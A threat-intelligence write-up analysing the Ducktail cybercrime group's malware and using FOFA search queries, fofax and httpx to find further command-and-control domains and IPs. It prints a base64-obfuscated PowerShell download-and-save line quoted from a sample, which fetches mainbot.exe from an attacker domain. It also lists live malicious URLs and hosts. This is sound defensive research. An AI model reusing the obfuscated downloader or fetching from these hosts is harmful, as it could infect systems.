![1](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktailen.png)

# Practical FOFA Asset Expansion：Ducktail

## Overview
Ducktail is a cybercrime team discovered in 2021 with Vietnamese origins. The group primarily targets Facebook corporate accounts, using malicious programs disguised as images, documents, and other files. They employ spear-phishing attacks to compromise individuals authorized to manage Facebook corporate accounts. Once they gain access to the target account, they publish advertisements, damaging the victim's reputation and generating profits.

This article analyzes publicly available Indicators of Compromise (IOC) and, during the FOFA reconnaissance process, not only identifies assets not covered by existing knowledge but also uncovers the Ducktail's repeated use of domain assets, reactivating previously offline assets.

## IOC Analysis
From the shared IOCs by Yogesh Londhe, two samples related to Ducktail were found:

![2](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail2.png)

Using VT for sample analysis, the callback address was identified as gdfsgfdrgetgergdsf[.]tech.

![3](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail3.png)

Downloading the associated jpg file revealed the presence of the Download-FileWithRetry function, enabling remote file downloads with retry functionality.

```
https://gdfsgfdrgetgergdsf.tech/file/ps/330d9d3b5819c6c71029767bfb8c0ae1.jpg
```

![4](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail4.png)

Analysis of the function's call process reveals that the remote file download parameters are $cnxjunbsg + $egdac.

Download-FileWithRetry -url ($cnxjunbsg + $egdac) -destination ($lafaelcbl + $yzabgcjvrd);

The specific parameter values are:

```
$cnxjunbsg=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("aHR0cDovL2dkZnNnZmRyZw=="));
$egdac=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("ZXRnZXJnZHNmLnRlY2gvZmlsZS90L21haW5ib3QuZXhl"));
$lafaelcbl=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("QzpcVw=="));
$yzabgcjvrd=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("aW5kb3dzXFRlbXBcc3Zjekhvc3QuZXhl"));
```

Decrypting these base64-encoded parameters reveals their purpose: downloading an exe file from the website and storing it locally.

```
aHR0cDovL2dkZnNnZmRyZw==ZXRnZXJnZHNmLnRlY2gvZmlsZS90L21haW5ib3QuZXhl
Decrypts to http://gdfsgfdrgetgergdsf.tech/file/t/mainbot.exe
```

The locally stored file and path are:

```
QzpcVw==aW5kb3dzXFRlbXBcc3Zjekhvc3QuZXhl
Decrypts to C:\Windows\Temp\svczHost.exe
```

Using VT for dynamic analysis of the exe file reveals its Command and Control (C2) IP (138.201.8.186).

```
https://www.virustotal.com/gui/file/e916b412760ea5b9ab66df77808337a632c130a3d1820df2a2d4d1e5e28bc21c/behavior
```

![5](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail5.png)

### Analysis Conclusion

```
Integrating the information extracted so far, we summarize that this criminal team has multiple IOC characteristics.
1. Fixed file download paths:
  /file/t/mainbot.exe
  /file/t/RdpService.exe
  /file/t/TermService.exe
  /file/rdpwrap.txt
2. Fixed authentication path with consistent response packet size
  /api/check
  (hxxp://138.201.8.186/api/check [200] [355])
3. Domain addresses are routed through Cloudflare for traffic proxying, undergoing CDN relay.
```

## FOFA Discovery

### Cloudflare Rules

Initially, a FOFA search for the gdfsgfdrgetgergdsf.tech domain is conducted to identify its features. Features extracted include its header response, icon status, certificate status, JARM value, hash value computed from the body, and more. After organizing these features, the following combination is obtained:

```
header="HTTP/1.1 404 Not Found" && header="Server: cloudflare" && icon_hash="" && header="Transfer-Encoding: chunked" && cert.issuer!="" && cert.subject.org="" && cert.issuer.cn!="" && cert.is_valid=true && jarm="29d3dd00029d29d21c42d43d00041d44609a5a9a88e797f466e878a82e8365" && body_hash="-1840324437" && header!="X-Powered-By" && header!="Strict-Transport-Security" && header!="Pragma"
```

![6](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail6.png)

Apart from the above feature extraction, it is observed that the data's ISP is Cloudflare, and there is no icon or title. As the header response format is consistent, the computed hash value is directly taken for combination:

```
org="CLOUDFLARENET" && icon_hash="" && title="" && header_hash="-2069571899"
```

![7](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail7.png)

Upon verification, both syntax rules match known IOCs.

![8](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail8.png)

The data is then extracted, and collision

 matching is performed on the fixed paths. The tool used here is fofax.

```
/file/t/mainbot.exe
/api/check
```

![9](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail9.png)

![10](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail10.png)

Collision results in the discovery of the moutainseagroup.com domain, which allows file download. Further verification with alternative paths reveals its continued existence. Manual verification using the api/check path confirms:

![11](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail11.png)

![12](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail12.png)

Based on these features, the domain is identified as an unknown malicious domain, not covered in threat intelligence platforms.

![13](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail13.png)

Interestingly, during early analysis of this team, gdfsgfdrgetgergdsf.tech was inaccessible, but another domain, wordpress.ductai.xyz, was active and allowed malicious file downloads.

![14](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail14.png)

However, while compiling the article, gdfsgfdrgetgergdsf.tech became accessible again. Simultaneously, the "wordpress.ductai.xyz" domain became inaccessible, indicating that the team cycles through these domains within a period and does not readily abandon previously used ones.
Known active IOCs are:

```
dailyfasterauto.info
gdfsgfdrgetgergdsf.tech
moutainseagroup.com
```

### C2 Rules

The analysis continues with another lead, searching for sites with the obtained IP 138.201.8.186 that share the same template.

![15](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail15.png)

After categorizing based on its unique features, the syntax becomes:

```
header="404 Not Found" && header="Transfer-Encoding: chunked" && header="Server: Microsoft-IIS" && icon_hash="" && title="" && header_hash="-324809210"
```

![16](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail16.png)

However, due to a high false-positive rate, this template needs to be combined with the /api/check path for judgment. Fofax is used again for this purpose, with the command line:

```
fofax -q 'header="404 Not Found" && header="Transfer-Encoding: chunked" && header="Server: Microsoft-IIS" && icon_hash="" && title="" && header_hash="-324809210"' -fs 10000 | httpx -path /api/check -sc -cl -mc 200 -ml 355
```

This yields a new batch of active IOCs:

![17](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail17.png)

```
118.69.35.98:8001
118.69.35.98:8000
138.201.8.186
138.201.8.186:8000
23.88.71.29:8000
fggfdbvcbvcbcboxes.online
sofggfdbvcbvcbc.online
t.sofggfdbvcbvcbc.online
t.sofggfdbvcbvcbc.online:8000
www.sofggfdbvcbvcbc.online:8000
www.sofggfdbvcbvcbc.online
```

Further validation is performed by checking these domains and IPs using the /api/check path.

```
cat url.txt | httpx -sc -cl -path path.txt -mc 200
```

![18](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail18.png)

## Summary

Through partial IOC analysis, the C2 features of this team are successfully discovered. During the research process, not only were assets not marked by existing coverage found, but also the team's repeated use of domain assets was identified, indicating their tendency to reactivate previously offline assets.

This case involves analysis and identification of threat intelligence that includes aspects such as subdirectory collision. Combining FOFA platform's continuous information gathering capability, if teamal features remain unchanged, monitoring these syntax rules for assets and periodically fetching data for collision allows dynamic acquisition of the latest asset information, covering threats more quickly.

## Appendix
IOC and Threat Intelligence Platform Coverage:

| IOC  | Threatbook  | Virustotal  | Qianxin  |
|:----------|:----------|:----------|:----------|
| dailyfasterauto.info    |     | Malicious    | APT    |
| gdfsgfdrgetgergdsf.tech    | Malicious    | Malicious    | APT   |
| moutainseagroup.com    |    |    |     |
| 118.69.35.98   |    | Malicious   | Suspicious   |
| 138.201.8.186    |     | Malicious    | APT    |
| 23.88.71.29   | Malicious    | Malicious    | APT    |
| fggfdbvcbvcbcboxes.online    |     | Malicious   |    |
| sofggfdbvcbvcbc.online    |    | Malicious   | APT    |

## References:

Ducktail and Peeling the Layers of PowerShell

https://www.esentire.com/blog/ducktail-and-peeling-the-layers-of-powershell

https://twitter.com/suyog41/status/1738073411585478697

https://github.com/xiecat/fofax